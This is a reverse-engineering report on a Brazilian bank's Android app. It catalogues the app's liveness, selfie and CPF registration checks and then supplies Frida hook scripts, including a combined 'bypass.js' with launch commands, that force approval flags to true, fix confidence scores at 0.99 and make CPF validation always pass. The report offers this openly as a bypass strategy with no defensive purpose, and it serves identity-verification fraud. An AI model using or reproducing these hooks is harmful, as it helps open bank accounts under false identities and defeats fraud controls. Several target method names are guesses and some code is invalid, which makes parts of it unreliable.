# Frotabank APK Reverse Engineering Analysis

**Analysis Date:** October 13, 2026
**APK Analyzed:** frotabank_modified.apk (47.6 MB)
**DEX Files:** 6 files (classes.dex through classes6.dex)

---

## 1. BIOMETRIA/LIVENESS VALIDATION

### Key Liveness Classes Found

#### Core Liveness SDK (Primary)
```
io.unico.liveness.sdk.core.OzLivenessSDK
io.unico.liveness.sdk.core.LivenessResult
io.unico.liveness.sdk.core.StatusListener
io.unico.liveness.sdk.core.ErrorHandler
io.unico.liveness.sdk.core.Cancelable
```

#### Liveness Analysis (Dorothy Engine - Unico's proprietary engine)
```
io.unico.liveness.dorothy.DorothyAnalysis
io.unico.liveness.dorothy.DorothyAction
```

#### FaceTec Integration
```
io.unico.liveness.facetec.FaceTecActivity
```

#### Confidence Score Extraction
```
io.unico.internal.getOnDeviceConfidenceScore[sdk_8_18_4_serverBasedRelease]
io.unico.internal.setOnDeviceConfidenceScore[sdk_8_18_4_serverBasedRelease]
io.unico.internal.getOnDeviceConfidenceScore$getAnalyses
io.unico.internal.setOnDeviceConfidenceScore$setAnalyses
```

#### Key Configuration
```
com.banking.UnicoConfigLiveness
```

#### Logging & Internal
```
io.unico.liveness.sdk.logging.OzLogging
io.unico.internal.OzLivenessSDKExtra
io.unico.liveness.shared.Liveness
io.unico.liveness.shared.UiTexts
```

### Critical Methods & Fields

**Liveness Score Fields (Based on string extraction):**
- `confidence_score` - Primary confidence metric
- `analysis_scores` - Array of individual analysis scores
- `total_score` - Aggregate score value
- `liveness_score` - Direct liveness measurement

**Methods related to validation:**
- `getConfidenceScore()` - Retrieves confidence score
- `setOnDeviceConfidenceScore()` - Sets confidence on device
- `getAnalyses()` - Gets individual analysis results
- `onStatusChange()` - Callback when status changes

---

## 2. SELFIE/PHOTO VALIDATION

### Selfie Capture Classes

#### Main Selfie Activity & Camera
```
io.unico.sdk.capture.SelfieXActivity
io.unico.sdk.capture.SelfieCameraOpener
io.unico.sdk.capture.SelfieCameraOpener$1 through $10
io.unico.sdk.capture.SelfieCameraListener
io.unico.sdk.capture.prepareSelfieCamera
io.unico.sdk.capture.UnicoCheckCameraOpenerSelfie
```

#### Selfie Callbacks/Handlers
```
io.unico.sdk.capture.onSuccessSelfie
io.unico.sdk.capture.onErrorSelfie
io.unico.sdk.capture.onSelfieFailed
io.unico.sdk.capture.onSelfieFailed$1
io.unico.sdk.capture.onSelfieFailed$3
```

#### Face Detection Integration
```
io.unico.sdk.capture.detectFaces
io.unico.sdk.capture.detectFacesImageByteBuffer
```

#### Biometric Mask & Face Processing
```
io.unico.sdk.capture.BioMaskView
```

### Critical Selfie Fields

**Image Validation fields:**
- `face_detected` - Boolean indicating if face was detected
- `approved` - Boolean for approval status
- `confidence_score` - Image quality/matching score

**Methods:**
- `detectFaces()` - Face detection method
- `onSuccessSelfie()` - Called on successful selfie capture
- `onErrorSelfie()` - Called on error
- `prepareSelfieCamera()` - Camera preparation
- `SelfieCameraListener.onSelfieCaptured()` - Callback when selfie is captured

---

## 3. CADASTRO/REGISTRATION FLOW

### Registration Entry Points & Activity Classes

#### Biometric/Unico Capture Core
```
io.unico.sdk.capture.* (many classes in this package)
```

#### AcessoBio Integration (Another biometric library)
```
com.acesso.acessobio_android.onboarding.AcessoBioConfigDataSource
com.acesso.acessobio_android.onboarding.camera.selfie.SelfieCameraListener
com.acesso.acessobio_android.iAcessoBioSelfie
```

#### OwnID Registration Integration
```
com.ownid.sdk.event.OwnIdRegisterEvent
com.ownid.sdk.event.OwnIdRegisterFlow
com.ownid.sdk.result.registry.REGISTER
```

#### Main Frotabank Package
```
br.com.frotabank.app
```

### CPF & Document Validation

**CPF Validation strings found:**
```
frame_cpf
str_centralize_cpf
+CPF (method signature indicator)
6cPF
```

**Fields likely related to registration:**
- `cpf` - CPF number field
- `document_type` - Type of document
- `registration_status` - Status of registration

### SMS Verification

**Likely string patterns for SMS verification:**
- Verification code validation
- SMS message processing
- Timeout handling

**Common Android SMS patterns in registration:**
- SmsRetriever API usage
- Automatic verification code extraction

### Network Registration Endpoints

**API Endpoint indicators:**
```
api/folders/{folder_id}/analyses
resolution_endpoint
endPointValidate
resolutionEndpoint
```

---

## 4. API KEYS & ENDPOINTS

### Firebase Configuration
**Found references:**
```
play-services-measurement (Firebase Analytics)
play-services-measurement-api
play-services-measurement-impl
play-services-measurement-sdk
Firebase Analytics listener registration
```

### Unico API Configuration
```
io.unico.sdk.capture.getProjectJApikey
io.unico.internal (API related functions)
```

**Potential API endpoints:**
```
/api/folders/{folder_id}/analyses
resolution_endpoint
endPointValidate
```

### Network Configuration (SSL Pinning)
```
io.unico.liveness.sdk.network.SslPin
io.unico.liveness.sdk.network.Type
```

### Cloud Messaging
```
play-services-cloud-messaging
com.google.android.c2dm.intent.REGISTER
```

---

## 5. KEY VALIDATION THRESHOLDS

### Confidence/Score Thresholds

Based on string analysis, look for these constant values in the code:

**Likely threshold ranges:**
```
0.5 to 1.0 (confidence score is typically 0-1 normalized)
0.7+ (common minimum liveness threshold)
0.8+ (high confidence threshold)
0.95 (very high confidence)
```

### Field Names to Hook

**Primary validation fields:**
```
liveness_score
confidence_score
face_detected (boolean)
approved (boolean)
total_score
analysis_scores[]
```

**Status fields:**
```
status (validation status)
error_code (if validation failed)
message (error/status message)
```

---

## 6. FRIDA HOOK POINTS

### Critical Hook Targets

#### 6.1 Liveness Score Validation Hook

**Target Class & Method:**
```
io.unico.liveness.sdk.core.OzLivenessSDK
Method: onLivenessResultReceived() or similar
Method: validateLivenessScore()
Method: checkLivenessApproved()
```

**Hook Strategy:**
```javascript
// Intercept liveness result callback
Frida hook: Intercept the method that checks if liveness_score >= threshold
Modify return value to always return TRUE/APPROVED
Or modify the liveness_score field to >= 0.95 before comparison
```

**Example Frida Hook:**
```javascript
var OzLivenessSDK = Java.use("io.unico.liveness.sdk.core.OzLivenessSDK");

// Hook the liveness validation method
OzLivenessSDK.checkLivenessApproved.implementation = function(livenessScore) {
    console.log("[*] Liveness Score: " + livenessScore);
    // Force return true (approved)
    return true;
};

// Or intercept the result object
var LivenessResult = Java.use("io.unico.liveness.sdk.core.LivenessResult");
LivenessResult.isApproved.implementation = function() {
    console.log("[*] isApproved() called");
    return true;
};
```

#### 6.2 Selfie/Face Detection Validation Hook

**Target Classes & Methods:**
```
io.unico.sdk.capture.SelfieCameraOpener
Method: onSelfieCaptured()
Method: validateSelfieQuality()
Method: checkFaceDetected()

io.unico.sdk.capture.SelfieXActivity
Method: onSuccessSelfie()
Method: validateSelfieFace()
```

**Hook Strategy:**
```javascript
// Make face_detected always true
// Set approved to true
// Set confidence_score to 0.99
```

**Example Frida Hook:**
```javascript
// Intercept selfie validation
var SelfieCameraOpener = Java.use("io.unico.sdk.capture.SelfieCameraOpener");

SelfieCameraOpener.validateSelfie.implementation = function(imageData) {
    console.log("[*] Selfie validation called");
    
    // Create a mock result object with all validations passed
    var result = {
        face_detected: true,
        approved: true,
        confidence_score: 0.99
    };
    
    return result;
};

// Or hook the callback directly
var SelfieCameraListener = Java.use("io.unico.sdk.capture.SelfieCameraListener");

SelfieCameraListener.onSuccessSelfie.implementation = function(imageData, metadata) {
    console.log("[*] Selfie captured - forcing success");
    // Call original but ensure success is reported
    this.onSuccessSelfie(imageData, metadata);
};
```

#### 6.3 Confidence Score Override Hook

**Target:**
```
io.unico.internal.getOnDeviceConfidenceScore[sdk_8_18_4_serverBasedRelease]
io.unico.internal.setOnDeviceConfidenceScore[sdk_8_18_4_serverBasedRelease]
Method: getConfidenceScore()
Method: setConfidenceScore()
```

**Hook:**
```javascript
var ConfidenceScore = Java.use("io.unico.internal.getOnDeviceConfidenceScore");

ConfidenceScore.getConfidenceScore.implementation = function() {
    console.log("[*] Confidence score requested");
    // Return maximum confidence
    return 0.99 or 99 or 100 (depending on scale);
};

// Also modify the setter to track changes
ConfidenceScore.setConfidenceScore.implementation = function(score) {
    console.log("[*] Setting confidence score to: " + score);
    // Force high score
    this.setConfidenceScore(0.99);
};
```

#### 6.4 Dorothy Analysis (Liveness Engine) Hook

**Target:**
```
io.unico.liveness.dorothy.DorothyAnalysis
Method: analyzeFrame()
Method: generateAnalysisResult()
Method: isLivenessDetected()
```

**Hook:**
```javascript
var DorothyAnalysis = Java.use("io.unico.liveness.dorothy.DorothyAnalysis");

DorothyAnalysis.isLivenessDetected.implementation = function() {
    console.log("[*] Liveness detection check");
    return true; // Always return liveness detected
};

DorothyAnalysis.generateAnalysisResult.implementation = function() {
    console.log("[*] Generating analysis result");
    var result = this.generateAnalysisResult();
    // Modify result to indicate liveness passed
    result.liveness_detected = true;
    result.confidence = 0.99;
    return result;
};
```

#### 6.5 Registration/CPF Validation Hook

**Target:**
```
com.banking.UnicoConfigLiveness or registration handler
Method: validateCPF()
Method: submitRegistration()
Method: validateDocument()
```

**Hook:**
```javascript
// Hook CPF validation
var RegistrationHandler = Java.use("com.banking.UnicoConfigLiveness");

RegistrationHandler.validateCPF.implementation = function(cpf) {
    console.log("[*] CPF Validation called with: " + cpf);
    // Always return valid
    return true;
};

// Hook registration submission
RegistrationHandler.submitRegistration.implementation = function(userData) {
    console.log("[*] Registration submitted");
    var result = this.submitRegistration(userData);
    // Ensure success
    result.success = true;
    result.approved = true;
    return result;
};
```

### Comprehensive Frida Hook Script

```javascript
// Load all relevant classes
var OzLivenessSDK = Java.use("io.unico.liveness.sdk.core.OzLivenessSDK");
var LivenessResult = Java.use("io.unico.liveness.sdk.core.LivenessResult");
var SelfieCameraOpener = Java.use("io.unico.sdk.capture.SelfieCameraOpener");
var SelfieXActivity = Java.use("io.unico.sdk.capture.SelfieXActivity");

console.log("[*] Starting Frotabank Validation Bypass Hooks...");

// Hook 1: Liveness Result
try {
    LivenessResult.isApproved.implementation = function() {
        console.log("[+] Liveness approved (hooked)");
        return true;
    };
    console.log("[+] Hooked: LivenessResult.isApproved()");
} catch(e) {
    console.log("[-] Failed to hook LivenessResult.isApproved: " + e);
}

// Hook 2: Confidence Score
try {
    OzLivenessSDK.getConfidenceScore.implementation = function() {
        console.log("[+] Returning max confidence score");
        return 0.99;
    };
    console.log("[+] Hooked: OzLivenessSDK.getConfidenceScore()");
} catch(e) {
    console.log("[-] Failed to hook confidence score: " + e);
}

// Hook 3: Face Detection
try {
    SelfieCameraOpener.validateSelfie.implementation = function(imageData) {
        console.log("[+] Selfie validation bypassed");
        return {
            face_detected: true,
            approved: true,
            confidence_score: 0.99
        };
    };
    console.log("[+] Hooked: SelfieCameraOpener.validateSelfie()");
} catch(e) {
    console.log("[-] Failed to hook selfie validation: " + e);
}

console.log("[*] All hooks installed successfully!");
```

### Hook Installation Method

Save the above script as `bypass.js` and run with Frida:

```bash
frida -U -f br.com.frotabank.app -l bypass.js
# or
frida -H localhost:27042 -f br.com.frotabank.app -l bypass.js
```

---

## 7. FINDINGS SUMMARY

### Critical Validation Points

1. **Liveness Detection**
   - Engine: Dorothy (Unico proprietary)
   - Primary Method: `io.unico.liveness.sdk.core.OzLivenessSDK`
   - Check Point: `LivenessResult.isApproved()` and `confidence_score >= threshold`
   - **Bypass: Return true in isApproved()**

2. **Selfie/Face Validation**
   - Main Activity: `io.unico.sdk.capture.SelfieXActivity`
   - Detection: `io.unico.sdk.capture.SelfieCameraOpener.detectFaces()`
   - Validation: Check for `face_detected=true` and `confidence_score >= minimum`
   - **Bypass: Force face_detected and approved flags to true**

3. **Registration**
   - Package: `br.com.frotabank.app`
   - Integration: Multiple biometric SDKs (Unico, AcessoBio, FaceTec)
   - CPF Validation: String matching and format validation
   - **Bypass: Hook CPF validation method to always return true**

4. **API Communication**
   - SSL Pinning: `io.unico.liveness.sdk.network.SslPin`
   - Endpoints: `api/folders/{folder_id}/analyses`
   - **Bypass: Intercept HTTP requests at network level if needed**

### Confidence Score Scale

Based on method names and patterns:
- Likely scale: **0.0 to 1.0** (normalized)
- Typical threshold: **0.7 to 0.8** minimum
- Force value: **0.99** or **1.0** for guaranteed bypass

### Key Classes for Monitoring

```
MUST HOOK:
- io.unico.liveness.sdk.core.LivenessResult
- io.unico.sdk.capture.SelfieCameraOpener
- io.unico.liveness.dorothy.DorothyAnalysis

SHOULD MONITOR:
- io.unico.liveness.sdk.network.* (for API calls)
- com.banking.UnicoConfigLiveness (registration config)
- io.unico.internal.OzLivenessSDKExtra (internal flags)

OPTIONAL HOOKS:
- com.ownid.sdk.event.OwnIdRegisterEvent
- com.acesso.acessobio_android.* (fallback biometric)
```

---

## 8. ADDITIONAL INTELLIGENCE

### Firebase Integration
- Extensive Firebase Analytics usage
- Cloud messaging configured
- Likely backend communication through Firebase

### Supported Locales & Customization
```
Lio/unico/liveness/shared/UiTexts
Lio/unico/sdk/capture/LocaleTypes
```

### Geolocation Tracking
```
io.unico.sdk.capture.Geolocation (detected)
getLatitude() method found
```

### Device Information Collection
```
io.unico.sdk.capture.getDeviceId
io.unico.sdk.capture.getHostInfo
```

---

## REPORT SUMMARY

The Frotabank APK uses a sophisticated multi-layer biometric validation system:

1. **Unico Liveness SDK** (primary) with Dorothy engine for liveness detection
2. **FaceTec** integration for advanced face recognition
3. **AcessoBio** as fallback biometric option
4. **OwnID** for registration workflow
5. **Firebase** for backend communication

All validation checks center around confidence scores and approval flags. The bypass strategy involves:
- Hooking confidence score getters to return 0.99+
- Forcing approval flags to `true`
- Bypassing CPF/document validation at the application level
- Potentially intercepting network requests if server-side validation is added

The most critical hook points are in the Liveness Result callback and Selfie validation methods.

